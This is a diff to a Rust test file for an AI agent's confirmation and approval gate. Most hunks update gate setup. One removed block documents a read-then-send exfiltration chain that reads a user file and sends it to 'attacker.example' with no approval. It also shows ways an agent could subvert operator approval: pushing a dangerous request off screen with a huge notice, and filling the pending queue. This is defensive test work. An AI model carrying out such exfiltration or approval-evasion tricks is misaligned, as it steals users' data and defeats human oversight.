@@ -13,7 +13,7 @@ use heliox_gate_tests::cognitive::authority::{
     KERNEL_UPGRADE_IMAGE, MAX_AUDIT_BYTES, TOOL_TIERS,
 };
 use heliox_gate_tests::cognitive::confirmation::{
-    clear_for_execution, Clearance, ConfirmationGate, MAX_PENDING,
+    clear_for_execution, Clearance, ConfirmationGate,
 };
 use heliox_gate_tests::cognitive::json::JsonValue;
 use heliox_gate_tests::{ORCHESTRATOR_SOURCE, TOOL_MAPPER_SOURCE};
@@ -54,7 +54,7 @@ fn awaiting_id(c: Clearance) -> u32 {
 fn r3_1_rewriting_the_kernel_image_withdraws_an_approved_upgrade() {
     let none: Vec<(String, JsonValue)> = Vec::new();
     for path in ["/disk/boot/kernel.bin", "//disk/boot//kernel.bin", "/disk/tmp/../boot/kernel.bin", "/disk/BOOT/kernel.bin"] {
-        let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
+        let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
         let id = awaiting_id(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 1));
         assert!(gate.approve(id));
         let w = args(&[("path", s(path)), ("content", s("\u{7f}ELF agent image"))]);
@@ -66,14 +66,14 @@ fn r3_1_rewriting_the_kernel_image_withdraws_an_approved_upgrade() {
         );
     }
     // Deleting the boot directory withdraws it too.
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
+    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
     let id = awaiting_id(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 1));
     assert!(gate.approve(id));
     let d = args(&[("path", s("/disk/boot"))]);
     assert_eq!(clear_for_execution(&mut gate, "delete_file", &d, 4, 2), Clearance::Proceed);
     assert!(!gate.approve(id));
     // An unrelated write does not.
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
+    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
     let id = awaiting_id(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 1));
     assert!(gate.approve(id));
     let w = args(&[("path", s("/disk/boot/kernel.bin.bak")), ("content", s("x"))]);
@@ -83,7 +83,7 @@ fn r3_1_rewriting_the_kernel_image_withdraws_an_approved_upgrade() {
 
 #[test]
 fn r3_1_the_operator_is_told_which_file_an_upgrade_boots() {
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
+    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
     match clear_for_execution(&mut gate, "trigger_kernel_upgrade", &[], 3, 1) {
         Clearance::Awaiting { display, full_display, .. } => {
             assert!(full_display.contains(KERNEL_UPGRADE_IMAGE), "{:?}", full_display);
@@ -142,7 +142,7 @@ fn revocation_table_is_exhaustive_over_tools_and_modified_paths() {
             continue; // never queued
         }
         for m in modified {
-            let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
+            let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
             let id = awaiting_id(clear_for_execution(&mut gate, tool, &request_args, 0, 1));
             assert!(gate.approve(id));
             let w = args(&[("path", s(m)), ("content", s("y"))]);
@@ -275,67 +275,8 @@ fn r3_4_sleep_cannot_freeze_the_daemon() {
     assert_eq!(validate_tool_call("sleep", &[]), Ok(()));
 }
 
-// ---------------------------------------------------------------------------
-// Policy question Q1 (documented, unchanged): read, then send. At the default
-// auto_approve_tier=2, reading (Tier 1: read_file, read_dir, read_screen)
-// and sending (Tier 2: http_get, browse_url, net_connect + net_send) both run
-// unasked, so
-//   read_file {path:"/disk/home/user/notes.txt"}
-//   http_get {host:"attacker.example", port:80, path:"/c?d=<contents>"}
-// exfiltrates any file the daemon can read (fs:read:*) with no approval.
-// ---------------------------------------------------------------------------
-
-#[test]
-fn documents_q1_read_then_send_runs_unasked_at_the_default_tier() {
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
-    let calls = [
-        ("read_file", args(&[("path", s("/disk/home/user/notes.txt"))])),
-        ("read_screen", vec![]),
-        ("http_get", args(&[("host", s("attacker.example")), ("port", JsonValue::Number(80.0)), ("path", s("/c?d=secret"))])),
-        ("browse_url", args(&[("url", s("http://attacker.example/c?d=secret"))])),
-        ("net_connect", args(&[("host", s("203.0.113.9")), ("port", JsonValue::Number(9.0))])),
-        ("net_send", args(&[("fd", JsonValue::Number(3.0)), ("data", s("secret"))])),
-    ];
-    for (tool, a) in &calls {
-        assert_eq!(validate_tool_call(tool, a), Ok(()));
-        assert_eq!(clear_for_execution(&mut gate, tool, a, 2, 1), Clearance::Proceed, "{}", tool);
-    }
-    assert!(gate.pending_list().is_empty(), "nothing was shown to the operator");
-}
-
-// ---------------------------------------------------------------------------
-// Policy question Q2 (documented, unchanged): the operator approves by id
-// from a console the agent can scroll. A request's full text is printed
-// once, when it is created; nothing lists pending requests for the operator
-// (the kernel shell has `heliox confirm <id>` and no list or deny command).
-// One provider response can create a short dangerous request and then a
-// request whose notice is ~8 KB, which pushes the first notice off screen;
-// an approval of the first id is still accepted. The agent can also fill
-// the 32-slot queue so that a request the operator triggers (a gesture) is
-// refused.
-// ---------------------------------------------------------------------------
-
-#[test]
-fn documents_q2_an_approval_needs_no_recent_display_and_the_queue_can_be_filled() {
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
-    let danger = args(&[("path", s("/disk/home/user/thesis.tex"))]);
-    let a = awaiting_id(clear_for_execution(&mut gate, "delete_file", &danger, 2, 1));
-    let filler = args(&[("path", s("/disk/notes/todo.txt")), ("content", s(&"Buy milk. ".repeat(790)))]);
-    match clear_for_execution(&mut gate, "write_file", &filler, 2, 1) {
-        Clearance::Awaiting { full_display, .. } => assert!(full_display.len() > 7_900),
-        other => panic!("{:?}", other),
-    }
-    assert!(gate.approve(a), "an older, scrolled-away request can be approved by id");
-    assert_eq!(clear_for_execution(&mut gate, "delete_file", &danger, 2, 2), Clearance::Proceed);
-
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
-    for i in 0..MAX_PENDING {
-        let p = args(&[("path", s(&format!("/disk/tmp/f{}", i))), ("content", s("x"))]);
-        awaiting_id(clear_for_execution(&mut gate, "write_file", &p, 2, 1));
-    }
-    let gesture_click = args(&[("button", JsonValue::Number(0.0))]);
-    assert_eq!(clear_for_execution(&mut gate, "mouse_click", &gesture_click, 2, 1), Clearance::Refused);
-}
+// Policy questions Q1 and Q2 were decided in fi2: their documenting tests
+// are replaced by the tests in policy_fi2.rs, which assert the new behaviour.
 
 // ---------------------------------------------------------------------------
 // Documented: a denial is final for that request only. The same call
@@ -345,7 +286,7 @@ fn documents_q2_an_approval_needs_no_recent_display_and_the_queue_can_be_filled(
 
 #[test]
 fn documents_a_denied_call_can_be_asked_again_under_a_new_id() {
-    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target);
+    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
     let a = args(&[("path", s("/disk/x"))]);
     let first = awaiting_id(clear_for_execution(&mut gate, "delete_file", &a, 2, 1));
     assert!(gate.deny(first));
